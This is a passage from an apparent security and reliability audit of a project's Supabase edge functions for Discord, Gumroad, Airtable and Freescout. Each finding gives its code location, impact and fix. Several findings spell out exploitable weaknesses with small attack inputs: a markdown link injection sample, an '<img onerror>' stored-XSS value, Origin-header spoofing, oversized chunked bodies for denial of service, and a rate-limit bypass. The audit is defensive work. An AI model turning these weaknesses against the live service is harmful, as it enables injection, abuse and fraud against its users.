- **Smallest fix:** Distinguish 'limiter unavailable' from 'allowed': on RPC error fall back to a conservative global cap or fail closed for the high-cost path, and alert on limiter errors instead of silently allowing.

### [Medium] Non-atomic already-linked check leans on a unique index the code also detects by substring-matching error text  `ownership` (CONFIRMED)
- **Where:** discord-oauth-callback/index.ts:200-258
- **What breaks:** Verified: the claimed-elsewhere SELECT (lines 203-217) and the profile UPDATE (231-238) are not in one transaction, so two concurrent callbacks for the same snowflake can both pass the check and race to write. Correctness then rests solely on a DB unique index firing 23505. The code detects the conflict as `linkError.message?.toLowerCase().includes('unique') || linkError.code === '23505'` (line 241-242) — it does check the code, but the OR-ed message-substring fallback can misclassify an unrelated unique violation as 'already_linked', and if the index was never applied (the documented hand-run-migration failure mode) duplicate snowflake binds go completely undetected — two profiles claim one Discord account.
- **Smallest fix:** Enforce the bind in a single DB function/transaction (ON CONFLICT), assert the unique index exists in CI, and detect conflict by error code (23505) only, not message text.

### [Medium] discord-project-update interpolates client_name/changes/milestones into a role-pinging Discord post unsanitized (markdown/link injection)  `security` (CONFIRMED)
- **Where:** discord-project-update/index.ts:159-198
- **What breaks:** Verified: payload strings (client_name, changes[], current_phase_milestones[], dates) are concatenated straight into the announcement content (lines 159-198) with no sanitization, while sibling discord-notify runs every field through sanitizeDiscordText (notify-utils.ts:55,79-80). allowed_mentions restricts pings to role 1083439364975112293 — but that role IS pinged on every post, and arbitrary markdown links ([label](https://evil)) and formatting inject freely into a message delivered to everyone with that role. Values can originate from stored project/client data, so 'admin-gated' does not make the content trusted.
- **Smallest fix:** Run all interpolated fields through the shared sanitizeDiscordText helper before building the message, matching discord-notify.

### [Medium] postFollowup drops the rest of a multi-chunk answer on first failure — user gets a silently truncated reply  `error-handling` (CONFIRMED)
- **Where:** discord-interactions/index.ts:204-233
- **What breaks:** Verified: on a chunk POST failure the loop logs and `break`s (lines 218-224), abandoning all remaining chunks. Earlier chunks are already posted, so the channel shows half an answer (or half a /support confirmation) with no indication it was cut. The failure is reported only to server logs; the user sees a plausible-but-incomplete response. For /support this can drop the ticket-created confirmation entirely, leaving the member unsure whether a ticket exists.
- **Smallest fix:** On a chunk failure, post a short 'response was truncated, please retry' followup (or retry that chunk) instead of silently breaking; consider one edited message rather than N sequential posts.

### [Medium] [added-in-verification] /fleety per-user rate limit is skipped entirely for any interaction lacking member.user.id (e.g. DM / user-install context)  `error-handling` (PLAUSIBLE)
- **Where:** discord-interactions/index.ts:290-292,414
- **What breaks:** discordUserId is read ONLY from interaction.member.user.id (lines 290-292). In a DM or user-installed-app context Discord puts the actor at interaction.user (top level), not interaction.member, so discordUserId is undefined. Line 414 guards the limiter as `if (discordUserId && !(await underRateLimit(discordUserId)))` — when discordUserId is undefined the whole condition short-circuits false, the rate limit is SKIPPED, and askFleety2 runs unbounded (and logs 'unknown'). underRateLimit is the ONLY per-user abuse bound before the expensive techfleet-chat 2.0 brain, and it silently no-ops for any signed interaction without member.user.id — draining the shared LLM budget. Conditional on the app being reachable via DM/user-install, hence PLAUSIBLE.
- **Smallest fix:** Fall back to interaction.user?.id when interaction.member is absent; if still no id, fail closed (refuse or apply a global cap) rather than skipping the limiter.

### [Low] Discord-sourced discord_username written straight to profiles with no server-side sanitizing chokepoint (ProfileService rule is UI-scoped, so it does not cover this path)  `security` (PLAUSIBLE)
- **Where:** discord-oauth-callback/index.ts:231-238; repair-discord-username/index.ts:139-142; backfill-discord-usernames/index.ts:118-121
- **What breaks:** Correction to first pass: the repo's ProfileService rule (decisions.md:27-28 and src/components/CLAUDE.md:4) is explicitly scoped to raw `supabase.from('profiles').update()` IN THE UI — ProfileService is a frontend TypeScript service and is not importable in the Deno edge runtime, so these three edge writes do not literally violate that rule. The residual risk is real but narrower: discord_username (rendered elsewhere in the app) is persisted from Discord with no shared server-side sanitize/allow-list chokepoint. Charset is narrow today (username field), so stored-XSS risk is low now, but there is no central guard if Discord loosens naming or a future path writes global_name into this column.
- **Smallest fix:** Add an edge-side sanitizing/allow-listed writer for profiles' Discord fields (deepSanitize equivalent) that all three edge functions call, so there is one chokepoint mirroring the UI's ProfileService.

### [Low] Six functions hand-roll the same anon+service client / getUser auth bootstrap instead of the shared helper  `under-engineering` (CONFIRMED)
- **Where:** discord-project-update/index.ts:103-117; manage-discord-roles/index.ts:94-161; backfill-discord-usernames/index.ts:46-66; repair-discord-username/index.ts:46-58; resolve-discord-id/index.ts:114-132; generate-discord-invite/index.ts:99-115
- **What breaks:** Verified: the OAuth functions use requireAuthenticatedRequest + getAdminClient, but six other Discord functions each re-implement JWT extraction, createClient(anon,{Authorization}), getUser/getClaims, and createClient(service) inline — and several spin up a fresh service-role client per audit-log/queue call (manage-discord-roles:147,291,318,391). The auth logic has already drifted: some use getUser (manage-discord-roles, discord-project-update), some getClaims (resolve, repair, backfill), admin checks split across user_roles direct-select vs has_role RPC. A fix to one auth path silently misses the others, and redundant clients are created per request.
- **Smallest fix:** Route all of them through requireAuthenticatedRequest + getAdminClient (with a shared admin-role helper) as the OAuth functions do; delete the per-call createClient duplicates.

### [Low] manage-discord-roles LIST leaks full guild role structure to any authenticated user  `security` (CONFIRMED)
- **Where:** manage-discord-roles/index.ts:146-210
- **What breaks:** Verified: the admin check is inside `if (body.action !== 'list')` (line 146), so LIST is reachable by any of ~767 logged-in users and returns every non-managed, non-@everyone role's {id, name, color, position} (lines 187-209). That is internal-structure reconnaissance (which role id maps to what) and, per finding 1, another unthrottled bot-token call any user can spam. Mutating actions are admin-gated, so impact is disclosure + rate pressure, not direct escalation.
- **Smallest fix:** Require the same admin role for LIST, or at least rate-limit it per user.

### [Low] manage-discord-roles assign has no allow-list of assignable roles — admin can grant any Discord role up to the bot's ceiling  `security` (CONFIRMED)
- **Where:** manage-discord-roles/index.ts:261-310
- **What breaks:** Verified: assign PUTs role_id onto discord_user_id (lines 265-271) with no restriction on which roles are grantable — 'managed' roles are filtered only from LIST (line 190), not from assign. A compromised or careless admin session can grant a high-privilege Discord role (up to the bot's own ceiling) to an arbitrary snowflake in one request. Admin-gated, so severity is bounded by admin trust, but there is no second guardrail.
- **Smallest fix:** Maintain an explicit server-side allow-list of assignable role ids (onboarding/community roles) and reject anything else.

### [Low] Origin/Referer 'UI-only' gate is spoofable and gives no protection against the bot/replay threat it claims to stop  `security` (CONFIRMED)
- **Where:** discord-notify/index.ts:31-34,61-64; resolve-discord-id/index.ts:82-86,97-103
- **What breaks:** Verified: both functions reject requests whose Origin/Referer isn't in ALLOWED_ORIGIN_PATTERNS, and discord-notify's header (lines 12-19) cites duplicate-suppression/origin as defense against 'authenticated session replay/bots.' Origin and Referer are request headers any non-browser client sets at will, so a script holding a valid JWT simply sends `Origin: https://techfleet.network` and passes. The gate is UX theater; the only real controls are the JWT and the rate limiter. It also creates false coverage that could justify weakening the real controls later.
- **Smallest fix:** Treat the origin check as non-security UX; rely on JWT + per-user rate limiting for the abuse bound and document that Origin is not trusted.

### [Low] get-discord-member-count: unauthenticated service-role write path with a thundering-herd refresh  `boundary` (CONFIRMED)
- **Where:** get-discord-member-count/index.ts:47-93
- **What breaks:** Verified: fully public (raw Deno.serve, no auth check) using the service-role client (line 65). When the 24h cache is stale there is no lock (lines 78-92), so a burst of concurrent landing-page loads each independently fetch Discord and upsert discord_guild_stats — redundant bot-token calls (feeds finding 1) and racing writes to the same guild_id row. No user input reaches the write so integrity risk is low, but it is an unauthenticated service-role write path that amplifies external calls under traffic spikes.
- **Smallest fix:** Guard the refresh with a single-flight lock (advisory lock or a 'refreshing' flag) so only one request repopulates the cache; serve stale-while-revalidate.

### [Low] [added-in-verification] backfill-discord-usernames runs an unbounded profiles scan with one sequential Discord call per row in a single request  `under-engineering` (CONFIRMED)
- **Where:** backfill-discord-usernames/index.ts:69-139
- **What breaks:** The candidate select (lines 69-73) pulls EVERY linked profile with no LIMIT/pagination, then the loop (91-139) makes a Discord members fetch (each with maxRetries:2) per target, sequentially, inside one HTTP request. At ~767 linked users this is up to ~767 serial Discord round-trips in a single invocation — it will hammer the shared bot token (feeds finding 1) and can exceed the edge function wall-clock limit, leaving a partial-completion state: some rows repaired, the rest not, and the errors[]/counts summary lost when the function is killed mid-loop. Admin-gated and re-runnable (idempotent per row), so bounded, but it does not scale.
- **Smallest fix:** Page the select (e.g. LIMIT + cursor) and process a bounded batch per invocation; return a continuation token, or move to a queue/cron worker with concurrency + backoff.

### [Low] [added-in-verification] Edge-function file annotations drift from actual auth posture (@edge-auth on a public fn, @edge-cron on JWT user endpoints)  `other` (CONFIRMED)
- **Where:** get-discord-member-count/index.ts:1 (// @edge-auth); resolve-discord-id/index.ts:1, manage-discord-roles/index.ts:1, generate-discord-invite/index.ts:1, repair-discord-username is @edge-cron/backfill @edge-auth
- **What breaks:** get-discord-member-count is tagged `// @edge-auth` (line 1) but its own line-3 comment and code make it public/no-auth; conversely resolve-discord-id, manage-discord-roles, and generate-discord-invite are tagged `// @edge-cron` yet are interactive JWT user endpoints. If these annotations drive verify_jwt / config generation or CI classification, the tags are silently wrong: a tool trusting `@edge-auth` on get-discord-member-count could flip verify_jwt=true and break the logged-out landing page, or a reviewer auditing 'which endpoints are user-facing' by tag gets a false map. Silent drift between declared and actual auth model across the Discord surface.
- **Smallest fix:** Reconcile each file's annotation with its real auth (public vs user-JWT vs cron), and add a check that the annotation matches config.toml verify_jwt so they cannot drift.

---

## Edge: Payments (Gumroad) & Airtable sync

### [High] Weekly backfill backstop cannot downgrade an existing member — ignoreDuplicates discards the refund/dispute/lapse state it just fetched  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/gumroad-backfill-all/index.ts:179 (upsert `{ onConflict: "sale_id", ignoreDuplicates: true }`); state computed and thrown away at :162-176
- **What breaks:** This cron job is documented (index.ts:6-14, migration 20260803160500) as the belt-and-suspenders backstop that ingests 'anything those paths missed (e.g. a webhook that never arrived).' It fetches live per-sale refunded/disputed flags AND calls /v2/subscribers to compute subscription_ended_at/cancelled_at — then, for any sale_id already in the ledger, ignoreDuplicates:true silently drops ALL of it. So the one scenario the backstop is sold to cover — a REFUND / DISPUTE / SUBSCRIPTION-ENDED webhook that was lost after the original sale was recorded — is exactly the scenario it cannot fix. A refunded or lapsed buyer keeps 'Early Career Membership' / founding forever; reproject_membership_drift() at :185 then re-derives 'still active' from the stale ledger row and the tripwire stays green. Refund fraud persists indefinitely with no detector.
- **Smallest fix:** For existing rows do a downgrade-only merge instead of blanket ignore: when the API reports refunded/disputed/ended and the ledger column is currently NULL, UPDATE just those timestamp columns (never clearing them). Keeps 'don't clobber webhook state' for the fields the webhook owns while letting the backstop apply missed downgrades.
- _added-in-verification_

### [Medium] Per-user login backfill has the same blind spot — a lapsed/refunded member's existing sale row is never downgraded  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/gumroad-backfill/index.ts:275 (`ignoreDuplicates: true`); lifecycle fetched at :233-247, refunded/disputed computed at :261-262
- **What breaks:** Same root cause as the cron backstop, on the login/self-heal path. The function fetches /v2/subscribers precisely to 'stop a lapsed member self-restoring access' (:73-79, C1), but for a sale already in the ledger the freshly-fetched subscription_ended_at is discarded, so an already-active row is never revoked. The fail-closed guarantee only holds for brand-new inserts; it silently does not apply to the rows most likely to have lapsed. compute_membership() at :284 then returns the stale 'active' tier as authoritative.
- **Smallest fix:** Same downgrade-only merge as gumroad-backfill-all; extract it into _shared so both backfill paths apply missed lifecycle downgrades identically.
- _added-in-verification_

### [Medium] sync-airtable returns HTTP 200 on Airtable write failure and echoes the raw Airtable error to the caller  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/sync-airtable/index.ts:154-174
- **What breaks:** On any Airtable non-2xx the function returns status 200 with { success:false, error: `Airtable upsert failed [${status}]: ${errBody}` }. Any caller keying on the HTTP status (the common pattern for edge invocations) treats a hard failure as success, so general_applications and its Airtable mirror silently diverge with no signal. This 'report' satisfies none of recover/retry/report to any channel that acts on it — it's a swallowed failure wearing a 200. It also leaks Airtable's raw internal error body straight to the client. Unlike the persist-failure path it does not even emit an auditEdgeEvent, so the divergence is invisible in the Activity Log too.
- **Smallest fix:** Return a real non-2xx (e.g. 502) so callers/retries see the failure, replace errBody in the client response with a generic message (keep the detail in the server-side console.error), and emit an auditEdgeEvent so the drift is observable.

### [Medium] Airtable general_applications mirror has no reconciliation or drift detector — a copy 'kept in sync' by opportunistic client calls only  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/sync-airtable/index.ts (whole function); contrast supabase/functions/gumroad-backfill-all + reproject_membership_drift
- **What breaks:** Gumroad recognition has four layers (webhook, login reconcile, weekly backfill, nightly drift sweep + tripwire). The Airtable copy of general_applications has exactly one: a best-effort PATCH fired from the client at save time. If the client never calls it, the JWT expires mid-flow, or the write 200-fails (finding above), the Airtable record is permanently stale and nothing ever notices or repairs it. Two copies of the same fact with no owner-driven reconciliation always disagree eventually; here there is no job that re-pushes DB truth to Airtable or flags divergence.
- **Smallest fix:** Add a scheduled server-side resync (service-role, same pattern as gumroad-backfill-all) that pushes changed general_applications rows to Airtable and audits mismatches, so the mirror self-heals instead of drifting.
- _added-in-verification_

### [Medium] Email is the sole join key between Gumroad sales and profiles — an email change silently strips paid access  `ownership` (PLAUSIBLE)
- **Where:** gumroad-webhook/index.ts:196-201; gumroad-reconcile/index.ts:66-73; migration 20260803120000 trg_profile_resolve_pending:304-311
- **What breaks:** Every resolution path binds a sale to a user by lower(email) equality between gumroad_sales.email (the Gumroad receipt email) and profiles.email. A member who bought under one email and later changes their profile email — or whose Gumroad email differs from their login email — is never resolved: the sale stays resolved_user_id NULL / status pending_user, compute_membership finds no backing sale, and they are silently demoted to starter despite an active paid subscription. The only recovery is an admin manually calling attach_gumroad_sale. There is no audit event for 'paid sale that has sat unresolved for N days,' so these orphans are invisible.
- **Smallest fix:** Emit an observability event (and surface on membership_health) for gumroad_sales rows that stay pending_user beyond a threshold, so email-mismatch orphans are caught and admin-attached instead of silently losing access.
- _added-in-verification_

### [Medium] gumroad-backfill-all is a sequential N+1 in a single 60s-bounded cron invocation with no checkpoint — dies before reprojecting at scale  `under-engineering` (PLAUSIBLE)
- **Where:** supabase/functions/gumroad-backfill-all/index.ts:148-189; cron timeout_milliseconds:60000 in migration 20260803160500:36
- **What breaks:** The ingest loop runs, per sale, a sequential profiles SELECT (:162) + upsert (:165), plus a /v2/subscribers fetch per unique subscription (:157), across up to 100 pages — all awaited serially in one edge invocation the cron caps at 60s. As sale volume grows this blows the wall clock. There is no checkpoint/resume and reproject_membership_drift() only runs after the loop completes (:185), so a timeout leaves a partial ingest with NO reprojection, and the next weekly run restarts from page 1 re-fetching everything. Past some volume the backstop can never finish, and its failure is a silent non-completion rather than an audited error.
- **Smallest fix:** Batch the profile lookups/upserts (bulk email IN-query + multi-row upsert), and add page-cursor checkpointing so a run resumes instead of restarting; or split ingest and reproject into separately-triggered steps.
- _added-in-verification_

### [Low] Webhook body-size cap measures string length, not bytes, despite the comment claiming 'ACTUAL bytes read'  `security` (CONFIRMED)
- **Where:** supabase/functions/gumroad-webhook/index.ts:84-87
- **What breaks:** readBody() checks raw.length (UTF-16 code units) against MAX_BODY_BYTES, with a comment asserting it enforces the cap 'on ACTUAL bytes read.' A multibyte payload can carry up to ~2x MAX_BODY_BYTES actual bytes and still pass, so the DoS guard is looser than documented; the header pre-check at :108 is also bypassable (chunked/absent Content-Length, which the code itself notes). Low impact given the webhook is service-role and rate-limited upstream, but the comment misrepresents the guarantee.
- **Smallest fix:** Cap on new TextEncoder().encode(raw).length (or read the ArrayBuffer and check byteLength) and fix the comment.

### [Low] Lifecycle patch matched by subscription_id (sale_id absent) rewrites every sale row of the subscription  `error-handling` (PLAUSIBLE)
- **Where:** supabase/functions/gumroad-webhook/index.ts:155-158
- **What breaks:** When a lifecycle event lacks sale_id it falls back to `.eq("subscription_id", ...)`, applying buildLifecyclePatch to ALL ledger rows for that subscription. For cancelled/ended that is intended, but a refund or dispute event arriving without a sale_id would stamp refunded_at/disputed_at across the subscription's entire charge history, over-revoking founding and tier from a single-charge refund. Blast radius is unbounded per subscription even though likelihood is low (refund/dispute pings normally carry sale_id).
- **Smallest fix:** Require sale_id for refund/dispute patches (return 400 if absent) and restrict subscription_id-only matching to whole-subscription events (cancel/ended).

### [Low] Gumroad ping secret is passed in the URL query string, exposing it to proxy/CDN/access logs  `security` (PLAUSIBLE)
- **Where:** supabase/functions/gumroad-webhook/index.ts:114
- **What breaks:** Auth is a shared secret read from `?secret=`. The constant-time compare protects against timing attacks, but query strings are routinely captured in edge/proxy/CDN and platform access logs, so the long-lived ping secret can leak into log stores that outlive and out-scope the function. Gumroad constrains this to a URL param, but there is no log-scrubbing note or rotation hook, so a log exposure silently hands an attacker the ability to forge sales (subject only to the seller_id check).
- **Smallest fix:** Document the secret-in-URL exposure and a rotation procedure, ensure the platform scrubs query strings from logs for this route, and treat the secret as rotatable (env-driven) rather than permanent.
- _added-in-verification_

---

## Edge: Freescout & support

### [High] Webhook records dedupe tripwire BEFORE enqueue — transient enqueue failure permanently loses the event  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/freescout-webhook/index.ts:60-79
- **What breaks:** Verified: the unique insert into support_webhook_events (line 60) commits first, then freescout_enqueue_event runs (line 68). On a transient enqueue failure the handler returns 500 (line 78) and Freescout retries; the retry now hits 23505 on the dedupe insert and returns {ok:true,deduped:true} at line 63-65 WITHOUT ever enqueuing. The admin reply / status change / assignment is dropped forever — no pointer update, no notification, no reply email. Same swallowed-support-event shape as HELP-DESK-028.
- **Smallest fix:** Enqueue first and record the dedupe row only after the enqueue durably succeeds (or do both in one RPC/transaction, or delete the dedupe row when enqueue fails so the retry re-processes).

### [High] Circuit breaker is permanently disabled after its first trip — stops protecting Pikapod  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescout.ts:61-80
- **What breaks:** Verified against the state machine. After the breaker opens (failures>=5, openedAt=T0) and the 30s cooldown elapses, breakerOpen() sets failures=THRESHOLD-1=4 but leaves openedAt=T0 (line 63-66). The next failure calls recordFailure(): failures becomes 5, but the openedAt refresh is guarded by `openedAt === 0` (line 71-72) and openedAt is still the stale T0, so it is never updated. Every later breakerOpen() then sees now-T0 >> cooldown and returns false. After the first outage cycle the breaker never re-opens, so during a real Pikapod outage every request is forwarded and hammers the dead upstream — the exact thundering herd the breaker exists to stop. It only self-repairs on a single success (recordSuccess resets openedAt=0).
- **Smallest fix:** In breakerOpen's cooldown branch fully reset (failures=0, openedAt=0) instead of leaving a stale openedAt, or have recordFailure refresh openedAt whenever failures crosses the threshold regardless of its prior value.

### [High] freescoutFetch blindly retries non-idempotent POST/PUT — duplicate customers, tickets, and customer-facing replies  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescout.ts:189-193,222-225
- **What breaks:** Verified: the retry loop re-issues the SAME request on network error (189-192) and any 5xx (222-225) with no method guard. createCustomer/createUser/create-conversation/reply-thread are all POSTs (lines 343-357, 368-389, and proxy create/reply). If Freescout commits the write but the response is lost (post-commit timeout, proxy 502), the retry fires a second POST: duplicate Freescout customer (wrong id then stored on the profile), duplicate ticket, or a duplicate reply thread that emails the customer twice. No idempotency token is ever sent. At 767 users any Pikapod hiccup produces duplicates.
- **Smallest fix:** Auto-retry only idempotent methods (GET); for POST/PUT do not retry, or send a Freescout idempotency token / re-check existence before re-issuing.

### [High] Event processor upsert writes customer_user_id=null on any unmatched-email event — wipes member ownership and RLS visibility  `ownership` (CONFIRMED)
- **Where:** supabase/functions/process-freescout-events/index.ts:47-86
- **What breaks:** Added in verification. The proxy's upsertPointer deliberately refuses to write a null owner (freescout-proxy/index.ts:205-212) because RLS 'members see own pointers' is customer_user_id = auth.uid(), so overwriting it with null makes the member lose their own ticket. The event processor does exactly the forbidden thing: customerUserId defaults to null (line 47) and is only set when the payload's customer email resolves to a profile (52-64); then the pointer upsert on conflict conversation_id UNCONDITIONALLY writes customer_user_id: customerUserId (75-77). So any drained event whose customer email doesn't match a profile (email mismatch between Freescout and profiles, an admin-side event, a missing customer block) overwrites an existing member-owned pointer's customer_user_id to null — the member's ticket vanishes from their Get Help view via RLS, silently, on the next event.
- **Smallest fix:** Mirror the proxy guard: only include customer_user_id in the upsert when a profile actually resolved (never write null over an existing owner), or upsert ownership separately with a coalesce that preserves the current value.
- _added-in-verification_

### [Medium] create/reply accept an idempotencyKey that is never used — dedup is racy and reply has none at all  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/freescout-proxy/index.ts:59,65,375-393,426-450
- **What breaks:** Verified: idempotencyKey is declared in the Zod schema (lines 59, 65) and never read anywhere in the handler. create instead relies on a 2-minute subject+owner SELECT (381-392) with no unique constraint or lock, so two concurrent submits both read no duplicate and both POST, creating two tickets. reply (426-450) has NO dedup at all, so a double-click or client retry posts two threads and — combined with the blind POST retry above — emails the customer twice. The declared idempotency contract is a lie to callers.
- **Smallest fix:** Honor idempotencyKey (persist it with a unique constraint and short-circuit on replay) or remove it from the schema and document the real guarantee.

### [Medium] support_ticket_events insert has no ON CONFLICT — pgmq redelivery duplicates audit rows and re-fires notifications; webhook comment claims otherwise  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/process-freescout-events/index.ts:75,88-102,120-127,239
- **What breaks:** Verified: only the pointer upsert (line 75) carries onConflict; the support_ticket_events.insert (line 88) has none. The webhook comment (freescout-webhook/index.ts:57-59) explicitly claims 'The processor also handles double-processing via its own ON CONFLICT path.' That path does not exist for the events table or for safe_create_notification. If processOne succeeds but freescout_delete_event (line 239) fails/times out, the pgmq visibility timeout re-delivers the message and the whole body re-runs: a duplicate support_ticket_events audit row AND a second safe_create_notification (duplicate in-app notification). The stated dedupe guarantee is false.
- **Smallest fix:** Add a unique key (event_id) on support_ticket_events and insert ON CONFLICT DO NOTHING, or dedupe by message event_id before the downstream writes.

### [Medium] Self-heal writes user-controlled names/email into profiles unsanitized and OVERWRITES existing rows despite the comment  `security` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescout-admin.ts:59-81
- **What breaks:** Verified: selfHealProfile derives first_name/last_name/email from auth.users.user_metadata (user-controlled at signup) and upserts them into profiles with ignoreDuplicates:false (line 73-81). The comment says 'if a row already exists we keep it' and '_NOT_ touching freescout_* columns', but ignoreDuplicates:false means an existing row's first_name/last_name/email ARE overwritten with the derived values — including the email-local-part fallback (line 63) — clobbering a real name on any concurrent/racing row. Names are written raw (no escaping at this writer), so a signup metadata value like an <img onerror> string lands verbatim in profiles.first_name (stored-XSS risk wherever names render; the events processor at line 116-119 escapes subjects precisely because this render path trusts stored values). PLAUSIBLE only on the XSS render sink; the overwrite is directly confirmed.
- **Smallest fix:** Never overwrite existing name/email columns during self-heal (ignoreDuplicates:true or explicit insert-if-absent), and sanitize before writing to match the escaping the notification path already relies on.

### [Medium] No single owner for profiles.freescout_customer_id / freescout_user_id — 4+ concurrent writers, all ignoring their update result  `ownership` (CONFIRMED)
- **Where:** supabase/functions/freescout-proxy/index.ts:153; supabase/functions/freescout-provision-customer/index.ts:70-73; supabase/functions/process-freescout-events/index.ts:65-69; supabase/functions/_shared/freescout-admin.ts:155-158; supabase/functions/support-provisioning-retry/index.ts:62,82-85
- **What breaks:** Verified: freescout_customer_id is written by freescout-proxy (ensureCustomerForUser:153), freescout-provision-customer (70-73), the event processor (65-69), and the retry drainer (82-85); freescout_user_id by provision-admin, resolveAdminFreescoutUserId (155-158), and retry (62). These run concurrently (proxy request + 15s event cron + retry cron) with no coordination, and every update discards its error result. Each path independently does findCustomerByEmail→createCustomer, so two concurrent 'first' provisions can create two Freescout customers and race to store different ids; the loser's tickets attach to an orphaned customer. No owning module or DB uniqueness enforces one writer.
- **Smallest fix:** Centralize freescout_* provisioning behind one function/RPC with an atomic insert-if-absent guarded by the DB, and check the update's error everywhere.

### [Medium] In-isolate response cache + invalidateAll produce cross-isolate stale reads and lost updates on a mutating workflow  `dependency` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescoutCache.ts:10,64-68; supabase/functions/freescout-proxy/index.ts:422-423,447-448,465,492
- **What breaks:** Verified: store and userTagIndex are module-level (per warm isolate) and invalidateAll() only clears the CURRENT isolate (freescoutCache.ts:65-68). After create/reply/assign the handler calls invalidateUser+invalidateAll, but other warm isolates keep serving stale listMine/get/listAll for up to their TTL (30s/30s/10s per READ_CACHE_TTL_MS). A member who replies then refreshes onto another isolate sees a list without their reply; two admins on different isolates both see a ticket as unassigned and double-assign it (lost update). The fan-out-collapse benefit is real but the cross-isolate staleness on a mutating workflow is unaddressed.
- **Smallest fix:** Drop caching for mutation-adjacent reads, cut the TTL drastically, or move invalidation to a shared store / version token instead of per-isolate memory.

### [Medium] Public webhook body cap trusts Content-Length and buffers+HMACs an unbounded body — CPU/memory-amplification DoS on the one public endpoint  `security` (CONFIRMED)
- **Where:** supabase/functions/freescout-webhook/index.ts:26-32; _shared/bounded-body.ts:1-4; _shared/freescout.ts:312
- **What breaks:** Verified: the PUBLIC webhook checks Content-Length (line 26) then calls req.text() (line 31) with no streaming bound — a caller that omits Content-Length or uses chunked transfer sails past the 256KB check and streams an arbitrarily large body, which is fully buffered AND HMAC-signed over the entire raw body (freescout.ts:312, called before any size rejection) by an unauthenticated attacker. The repo already built _shared/bounded-body.ts (readBoundedText) for exactly this (audit T-C, comment lines 1-4) and freescout-proxy uses parseJsonBody with a cap — the webhook is the one endpoint that doesn't, and it is the only unauthenticated one.
- **Smallest fix:** Read the body via readBoundedText before hashing; never trust Content-Length.

### [Medium] Service-role validator does NOT support the key rollover its callers' comments promise — comment/behavior drift on the auth path  `dependency` (CONFIRMED)
- **Where:** supabase/functions/_shared/service-role-auth.ts:38-48; freescout-provision-customer/index.ts:23-25; freescout-sync-customer/index.ts:20-21; support-provisioning-retry/index.ts:18-19; process-freescout-events/index.ts:4-5
- **What breaks:** Verified: authorizeServiceRoleRequest constant-time-compares the token against the single current SUPABASE_SERVICE_ROLE_KEY (lines 38-48) — there is no dual-key/rollover window and no sb_secret_* branch. Yet callers carry comments like 'accepts a legacy service-role JWT OR an opaque sb_secret_* token, so a Supabase key-format rollover can't 401-storm this worker' (provision-customer:23-25, sync-customer:20-21, retry:18-19) and process-freescout-events header says it 'accepts BOTH legacy JWT and opaque sb_secret_* tokens'. During a real key rotation, cron jobs still sending the old key get 403 and the entire support provisioning/sync/report/event-drain pipeline silently stalls while operators trust a comment that says it is safe. (Note: the WEBHOOK HMAC path DOES support a previous secret via FREESCOUT_WEBHOOK_SECRET_PREVIOUS — this drift is specific to the service-role validator.)
- **Smallest fix:** Implement a two-key acceptance window (current + previous SUPABASE_SERVICE_ROLE_KEY), or correct every comment to state rollover requires a simultaneous cron+secret cutover.

### [Medium] listAll applies the assigned/unassigned filter client-side AFTER upstream pagination — unassigned triage view hides real tickets  `boundary` (CONFIRMED)
- **Where:** supabase/functions/freescout-proxy/index.ts:311-330
- **What breaks:** Verified: Freescout paginates by mailbox/status server-side (lines 314-321, returning a single page), and the assigned/unassigned filter is applied in-memory on that one page (326-329). So the admin 'Unassigned' triage view shows only the unassigned subset OF page N — if page 1 is mostly assigned, the admin sees a near-empty unassigned list and never learns there are unassigned tickets on later pages. Real support tickets are invisible in triage and the page counts are meaningless. Business filtering trapped at the wrong layer.
- **Smallest fix:** Push the assigned/unassigned filter into the upstream query, or fetch all pages before filtering; do not filter a paginated slice client-side.

### [Medium] findCustomerByEmail returns list[0] with no email verification — wrong-customer binding risk / cross-member ticket exposure  `security` (PLAUSIBLE)
- **Where:** supabase/functions/_shared/freescout.ts:334-341
- **What breaks:** Verified: findCustomerByEmail issues /api/customers?email=X and returns list[0] (line 340) with no check that the returned customer's emails[].value actually equals X. The first arbitrary customer id is then persisted as the member's freescout_customer_id (proxy:150-153, provision-customer:61-73) and listMine queries tickets by that id (proxy:299), so if Freescout ever does loose/substring matching or returns multiple rows, a member could be bound to another person's customer record and see their conversations. Marked PLAUSIBLE because exposure depends on Freescout's current matching semantics — but nothing in this code enforces the invariant, so an upstream version bump opens it.
- **Smallest fix:** Require a case-insensitive exact match on emails[].value before adopting/persisting the id, and reject ambiguous multi-row results.

### [Medium] register-support-command hand-rolls its own clients and admin check, diverging from every other function  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/register-support-command/index.ts:32-53
- **What breaks:** Verified: every other function in this section uses requireAdminRequest / getAdminClient / the has_role RPC. This one instantiates createClient twice inline (lines 36, 47), re-derives ANON/SERVICE keys by hand (32-34), and checks admin by directly SELECTing user_roles (48-53) instead of has_role. If the role model evolves (super_admin implies admin, a roles view, soft-deleted rows), has_role is updated in one place and this direct table read silently diverges — a legitimate admin gets 403 or a role expressed only through the RPC's logic is mis-evaluated.
- **Smallest fix:** Replace with requireAdminRequest(req,'register-support-command') and the shared client helpers used everywhere else.

### [Medium] GDPR anonymize failures are never retried and are falsely marked 'success' by the retry drainer — PII persists in Freescout indefinitely  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/freescout-sync-customer/index.ts:47-91; supabase/functions/support-provisioning-retry/index.ts:71-93
- **What breaks:** Verified and worse than first stated. A failed anonymize/sync logs status:'retry' kind:'customer' (sync-customer:82-89) with no record that it was an anonymize intent. The retry drainer's 'customer' branch is provisioning-only: it does `if (!id)` and, since prof.freescout_customer_id IS still set for an anonymize target, it skips all work and INSERTs status:'success' (retry:72,87-93). So a right-to-be-forgotten anonymize that failed (e.g. Freescout rejects the PUT on an email collision) is never re-attempted AND is falsely closed as success — the member's real name/email stay on the Freescout customer record after account deletion, indefinitely and unalerted.
- **Smallest fix:** Give the drainer an anonymize/sync path that actually re-issues the PUT (record the intent on the log row), cap attempts, and page a human when a GDPR anonymize keeps failing.

### [Medium] provision-admin 'account ready' notification inserts non-existent columns inside an empty catch — silently never delivered  `error-handling` (CONFIRMED)
